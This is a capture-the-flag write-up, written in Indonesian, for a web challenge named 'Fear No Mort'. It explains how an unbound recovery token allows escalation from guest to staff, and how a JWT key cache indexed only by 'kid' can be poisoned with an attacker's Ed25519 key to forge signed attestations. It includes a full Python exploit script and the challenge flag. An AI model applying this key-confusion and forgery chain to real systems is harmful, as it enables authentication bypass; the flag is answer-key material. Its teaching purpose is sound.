# Kaito CTF - Fear No Mort (Night Desk)

- Write-Up Author: reybong
- Category: Web
- Flag: `Kaito{th3_d00r_w45_n3v3r_1n_th3_r00m_58e4c12a}`

## Challenge Description

> Tantangan Fear No Mort menyimulasikan aplikasi pengelolaan sesi penerimaan (*night desk*) yang bergantung pada verifikasi dokumen **JWT ber-algoritma EdDSA (Ed25519)**.

**Target URL:** `https://fear-no-mort-bhboluei.instance.tbf1.online`

## Analisis

Melalui kombinasi dua kerentanan utama (*Exploit Chain*), seorang penyerang tanpa hak akses (role `guest`) berhasil menaikkan wewenang menjadi `staff`, meracuni cache kunci verifikasi JWT server (`KeyResolver Cache Poisoning`), memalsukan tanda tangan dokumen penutupan sesi (`Discharge Attestation`), dan mengekstrak flag.

### 1. Unbound Recovery Token (Privilege Escalation)
* **Lokasi Kode:** `engine.py` & `app.py`
* **Analisis Celah:**  
  Di dalam `app.py`, aplikasi dikonfigurasi dengan parameter `bound_recovery=False`. 
  
  Pada `engine.py`:
  ```python
  if self.bound_recovery and (claims.get("realm") != realm or claims["sub"] != account["subject"]):
      raise DeskError("The document does not identify this directory account.", 403)
  ```
  Akibat `self.bound_recovery` bernilai `False`, *Short-Circuit Evaluation* pada Python mengabaikan seluruh pengecekan di dalam kurung. Tiket pemulihan yang didapatkan dari *Practice Realm* atas nama alias staf (`r.sanchez`) dapat ditukarkan di *Main Realm*, sehingga role penyerang otomatis naik menjadi `staff`.

### 2. KeyResolver Cache Poisoning (JWT Key Confusion)
* **Lokasi Kode:** `tokens.py`
* **Analisis Celah:**  
  Aplikasi dikonfigurasi dengan `partitioned=False`. Fungsi resolusi kunci pada `KeyResolver` menyimpan cache hanya berdasarkan `kid`:
  ```python
  index = (authority, kid) if self.partitioned else kid
  if index in self.entries:
      self.entries.move_to_end(index)
      return self.entries[index]
  ```
  Penyerang yang sudah menjadi `staff` dapat mendaftarkan *examiner* menggunakan kunci publik Ed25519 miliknya sendiri dengan menetapkan `kid` bernilai `door.1.<hex>` (menyamai `kid` penerimaan di Epoch 1). Ketika memicu `/api/examiners/test`, server memasukkan Kunci Publik Penyerang ke dalam cache `self.entries["door.1.<hex>"]`.

## Langkah Menemukan Flag

1. **Registrasi Sesi:** `POST /api/admissions` menghasilkan `Admission ID: f9e76494a53ee4b1eeca1e80` dan `Realm: table-833eaa3dd4b8`.
2. **Eskalasi Akses 1:** `POST /api/practice` (`r.sanchez`) $\rightarrow$ `POST /api/recovery/request` $\rightarrow$ `POST /api/recovery/redeem` (ke `table-833eaa3dd4b8`). Role berhasil berubah dari `guest` menjadi `staff`.
3. **Mendapatkan Target Key ID:** `POST /api/interviews` $\rightarrow$ `GET /api/reception/manifest` menghasilkan `scheduled_key.kid` bernilai `door.1.1b29c378bd9d5550`.
4. **Maju ke Epoch 1:** `POST /api/interviews/return` memajukan epoch ke `1` dengan realm baru `table-5756ccf7c239`.
5. **Eskalasi Akses 2:** Menukarkan kembali recovery tiket ke `table-5756ccf7c239` untuk mengembalikan role `staff`.
6. **Meracuni Cache Kunci (Poisoning):**
   - Menghasilkan pasangan kunci Ed25519 lokal.
   - Pendaftaran examiner via `POST /api/examiners` dengan `kid: door.1.1b29c378bd9d5550`.
   - Menguji examiner via `POST /api/examiners/test` untuk memaksa `KeyResolver` memasukkan kunci publik lokal ke dalam cache `door.1.1b29c378bd9d5550`.
7. **Discharge & Flag Extraction:**
   - Mengekstrak `nonce` dari `arrival_slip` (`4b7d529483809a8fde4dc62eb699ad624bd36583840f2328`).
   - Menandatangani JWT Discharge Attestation menggunakan kunci private lokal.
   - Memanggil `POST /api/reception/discharge` dan server merespon dengan Flag resmi.

Script otomatisasi eksploitasi (`exploit.py`):

```python
import base64
import os
import sys
import time
import jwt
import requests
import urllib3
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def run_exploit(target_url, verify_ssl=False):
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url
    target_url = target_url.rstrip("/")

    session = requests.Session()
    session.verify = verify_ssl

    # 1. Admissions
    res = session.post(f"{target_url}/api/admissions", json={"name": "Morty Smith"})
    data = res.json()
    csrf, admission_id, entrant, arrival_slip, realm = (
        data["csrf"], data["admission"], data["entrant"], data["arrival_slip"], data["realm"]
    )
    headers = {"X-Desk-CSRF": csrf}

    # 2. Privilege Escalation 1
    res = session.post(f"{target_url}/api/practice", json={"alias": "r.sanchez"}, headers=headers)
    practice_realm = res.json()["realm"]
    res = session.post(f"{target_url}/api/recovery/request", json={"realm": practice_realm}, headers=headers)
    ticket = res.json()["ticket"]
    session.post(f"{target_url}/api/recovery/redeem", json={"ticket": ticket, "realm": realm}, headers=headers)

    # 3. Epoch 1 Prep & Scheduled Key Discovery
    res = session.post(f"{target_url}/api/interviews", json={}, headers=headers)
    interview_id = res.json()["id"]
    manifest = session.get(f"{target_url}/api/reception/manifest", headers=headers).json()
    controller_iss, scheduled_kid = manifest["issuer"], manifest["scheduled_key"]["kid"]

    # 4. Advance Epoch
    epoch_1_realm = session.post(f"{target_url}/api/interviews/return", json={"interview": interview_id}, headers=headers).json()["realm"]

    # 5. Privilege Escalation 2 (Epoch 1)
    res = session.post(f"{target_url}/api/practice", json={"alias": "r.sanchez"}, headers=headers)
    practice_realm_2 = res.json()["realm"]
    ticket_2 = session.post(f"{target_url}/api/recovery/request", json={"realm": practice_realm_2}, headers=headers).json()["ticket"]
    session.post(f"{target_url}/api/recovery/redeem", json={"ticket": ticket_2, "realm": epoch_1_realm}, headers=headers)

    # 6. Key Poisoning Setup
    attacker_priv = Ed25519PrivateKey.generate()
    attacker_pub_bytes = attacker_priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    attacker_jwk = {
        "kty": "OKP", "crv": "Ed25519", "alg": "EdDSA", "use": "sig",
        "kid": scheduled_kid, "x": b64(attacker_pub_bytes)
    }

    # 7. Register & Test Examiner (Poison Cache)
    examiner_info = session.post(f"{target_url}/api/examiners", json={"jwk": attacker_jwk}, headers=headers).json()
    now = int(time.time())
    test_claims = {
        "iss": examiner_info["issuer"], "aud": "night-desk:examiner", "sub": examiner_info["subject"],
        "iat": now, "exp": now + 300, "jti": os.urandom(16).hex(), "nonce": examiner_info["nonce"],
        "realm": epoch_1_realm, "admission": admission_id
    }
    test_token = jwt.encode(test_claims, attacker_priv, algorithm="EdDSA", headers={"kid": scheduled_kid})
    session.post(f"{target_url}/api/examiners/test", json={"attestation": test_token}, headers=headers)

    # 8. Forge Discharge & Extract Flag
    nonce = jwt.decode(arrival_slip, options={"verify_signature": False})["nonce"]
    discharge_claims = {
        "iss": controller_iss, "aud": "night-desk:discharge", "sub": entrant,
        "iat": now, "exp": now + 300, "jti": os.urandom(16).hex(),
        "admission": admission_id, "nonce": nonce, "epoch": 1
    }
    discharge_token = jwt.encode(discharge_claims, attacker_priv, algorithm="EdDSA", headers={"kid": scheduled_kid})

    res = session.post(f"{target_url}/api/reception/discharge", json={
        "attestation": discharge_token, "arrival_slip": arrival_slip
    }, headers=headers)

    print(f"\n[🎉 SUCCESS] FLAG: {res.json()['flag']}\n")

if __name__ == "__main__":
    run_exploit(sys.argv[1])
```

Jalankan eksploitasi dengan perintah:
```bash
python exploit.py https://fear-no-mort-bhboluei.instance.tbf1.online
```

**Flag:** `Kaito{th3_d00r_w45_n3v3r_1n_th3_r00m_58e4c12a}`
